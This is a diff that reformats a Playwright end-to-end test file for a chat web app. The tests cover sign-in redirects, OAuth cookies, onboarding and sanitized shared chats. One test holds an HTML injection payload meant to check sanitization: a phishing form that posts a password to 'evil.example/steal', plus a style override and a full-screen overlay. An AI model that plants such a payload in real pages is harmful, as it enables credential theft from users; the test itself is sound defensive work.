@@ -23,9 +23,7 @@ const mockConfig = (page: Page, config: object) =>
 		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(config) })
 	);
 
-test('an anonymous visit to a protected route lands on /auth, and signing in returns to it', async ({
-	page
-}) => {
+test('an anonymous visit to a protected route lands on /auth, and signing in returns to it', async ({ page }) => {
 	await mockConfig(page, baseConfig);
 	await page.route('**/api/v1/auths/signin', (route) =>
 		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
@@ -54,9 +52,15 @@ test('an anonymous visit to a protected route lands on /auth, and signing in ret
 
 test('a redirect that would leave the app is ignored: signing in lands home instead of failing', async ({ page }) => {
 	await mockConfig(page, baseConfig);
-	await page.route('**/api/v1/auths/signin', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) }));
-	await page.route('**/api/v1/auths/', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) }));
-	await page.route('**/api/v1/auths/update/timezone', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: '{}' }));
+	await page.route('**/api/v1/auths/signin', (route) =>
+		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
+	);
+	await page.route('**/api/v1/auths/', (route) =>
+		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
+	);
+	await page.route('**/api/v1/auths/update/timezone', (route) =>
+		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
+	);
 	const errors: string[] = [];
 	page.on('pageerror', (e) => errors.push(String(e)));
 
@@ -88,9 +92,7 @@ test('a failed sign-in shows the backend error inline and stays on /auth', async
 	await expect(page).toHaveURL(/\/auth$/);
 });
 
-test('first-run onboarding is shown once config arrives, and leads into admin sign-up', async ({
-	page
-}) => {
+test('first-run onboarding is shown once config arrives, and leads into admin sign-up', async ({ page }) => {
 	// Regression: AuthPage's one-shot mount logic used to run against a still-
 	// null config and never re-run, so onboarding silently never appeared.
 	await mockConfig(page, { ...baseConfig, onboarding: true });
@@ -149,9 +151,7 @@ test('an OAuth callback (token cookie set by the backend) signs in and returns t
 	await page.route('**/api/v1/auths/update/timezone', (route) =>
 		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
 	);
-	await context.addCookies([
-		{ name: 'token', value: 'cookie-token', url: 'http://localhost:5174' }
-	]);
+	await context.addCookies([{ name: 'token', value: 'cookie-token', url: 'http://localhost:5174' }]);
 	await page.addInitScript(() => localStorage.setItem('redirectPath', '/notes'));
 
 	await page.goto('/auth');
@@ -184,9 +184,7 @@ test('/watch forwards a video id to the chat home as ?youtube=', async ({ page }
 	await expect(page).toHaveURL(/\/\?youtube=dQw4w9WgXcQ$/);
 });
 
-test('a shared chat renders read-only for an anonymous viewer, sanitized, with no Clone button', async ({
-	page
-}) => {
+test('a shared chat renders read-only for an anonymous viewer, sanitized, with no Clone button', async ({ page }) => {
 	await mockConfig(page, baseConfig);
 	await page.route('**/api/v1/chats/share/abc123', (route) =>
 		route.fulfill({
@@ -227,14 +225,27 @@ test('a shared chat renders read-only for an anonymous viewer, sanitized, with n
 	await expect(page).toHaveTitle('Explaining monads / local-llm');
 });
 
-test('a shared chat shows HTML in a message as text: no page styles, forms or overlays from the sharer', async ({ page }) => {
+test('a shared chat shows HTML in a message as text: no page styles, forms or overlays from the sharer', async ({
+	page
+}) => {
 	await mockConfig(page, baseConfig);
-	const attack = 'Sign in again <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"></form><div style="position:fixed;inset:0">overlay</div>';
+	const attack =
+		'Sign in again <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"></form><div style="position:fixed;inset:0">overlay</div>';
 	await page.route('**/api/v1/chats/share/evil', (route) =>
 		route.fulfill({
 			status: 200,
 			contentType: 'application/json',
-			body: JSON.stringify({ id: 'chat-2', chat: { title: 'Shared', timestamp: 1700000000000, history: { currentId: 'm1', messages: { m1: { id: 'm1', parentId: null, childrenIds: [], role: 'user', content: attack } } } } })
+			body: JSON.stringify({
+				id: 'chat-2',
+				chat: {
+					title: 'Shared',
+					timestamp: 1700000000000,
+					history: {
+						currentId: 'm1',
+						messages: { m1: { id: 'm1', parentId: null, childrenIds: [], role: 'user', content: attack } }
+					}
+				}
+			})
 		})
 	);
 
